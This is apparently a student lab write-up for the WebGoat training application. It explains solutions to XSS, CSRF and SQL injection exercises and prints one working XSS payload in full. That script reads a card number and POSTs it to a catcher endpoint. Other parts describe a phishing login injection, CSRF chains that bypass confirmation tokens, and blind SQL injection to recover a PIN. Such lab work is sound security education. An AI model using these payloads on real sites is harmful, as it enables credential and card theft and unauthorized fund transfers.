Part 1 Explanation:
After testing, we found that the input text bar is able to run our HTML code and Javascript functions by inserting 
the code into the text bar, which is a vulnerability. Therefore, we inserted a fake login region to phish the victim 
input his/her username and password, pretending to require login before using the search functionality. After the 
victim enters the credentials and presses the "Login" button, the Javascript function is called and the victim's 
credentials in the form will be uploaded to the catcher servlet by an HTTP-POST request. After everything is done, 
the script will print a "Successfully Logged in!" message to pretend normal.

Part 2 Explanation:
The field that allows users to input their three-digit codes is vulnerable and exploitable, as the server does not 
check the input to not contain Javascript. As a result, the Javascript will be injected into the location of the 
innerHTML region of the "message" element, as that is the location that shows the error input (i.e. the Javascript). 
Since when the victim clicks the button, he/she has entered the card number to the input named "input2". Therefore, 
we can use getElementsByName() to get the number. In addition, since the javascript is injected into the webpage, it 
is run from the website itself, so the same origin policy is not violated and we can access any element on the webpage.

Unencoded URL:
http://localhost:8090/WebGoat/start.mvc#attack/SCREEN_ID/900?input1=na&input2=<script>
    document.getElementsByName("input2")[0].value = "000";
    document.getElementsByName("buy")[0].addEventListener('click', function() {
        var cardnumber = document.getElementsByName("input1")[0].value;
        var url = "http://localhost:8090/WebGoat/catcher?PROPERTY=yes&stolen-credit-card=" + cardnumber;
        var xhttp = new XMLHttpRequest();
        xhttp.open("POST", url, false);
        xhttp.send();
    });
    document.getElementById("message").innerHTML="";
</script>

Part 3 Explanation:
The Message field is exploitable. We created one image which is 1 by 1 and with the src that request a fund transfer of 5000.

Part 4 Explanation:
The Message field is exploitable.
We created two images, where the first one has an src that requests a fund transfer, and the second one has an empty src initially. 
After the first image is loaded, i.e. the first request is sent, it uses the "onerror" event handler to run a javascript to overwrite 
the src of the second image by the URL that confirms the transfer. After that, the second image will fetch the new URL. 
As a result, the two requests will be sent in order, as the "onerror" handler will wait until the first load is completed, and the 
prompt is bypassed by the second request. Here we used "onerror" instead of "onload" because the image will not be loaded properly.

Part 5 Explanation:
The Message field is exploitable.
We created two iframes, where the first one started the transfer by fetching the URL that performs the first step in the "src" parameter. 
The returned token should be included in the first iframe, and as a result, we used Javascript in the "onload" event handler of the first 
iframe to get the token value from the contentDocument of the first iframe and created a URL that makes the transfer with the token. We 
then put the second URL to the src of the second iframe and the second iframe would fetch the second URL. The two requests are sent in order 
with a valid token, so the exploit is able to defeat the protection. The same origin policy is not violated because all frames are from the 
same origin.

Part 6 Explanation:
we added an "or 1=1" condition to the WHERE clause to make all tuples considered True and returned. In addition, we added a "--" to the command 
so that the original "'" sign would be parsed as a comment and be ignored in the final SQL command. As a result, the newly added condition was 
inserted as expected.

Part 7 Explanation:
The User ID field is vulnerable. For the first stage, we first input the the userid; followed by a sql command to update the table. For
the second stage, we have followed the trigger syntax provided to trigger when a new employee is inserted and update the email to 
ece568_22f@utoronto.ca

Part 8 Explanation:
We have used sql syntax like below as input for the account number field. 
101 and ((select pin from credit where cc_number= 1111222233334444)<2365);
101 and ((select pin from credit where cc_number= 1111222233334444)>2363);
We have assumed that the account pin is a four digits number. Then, we conducted binary search. We can narrow down the range by half
everytime we input by looking at if the account number is valid. As a result, we have narrow down the range to be greater than 2363 and 
smaller than 2365. So the pin is 2364.
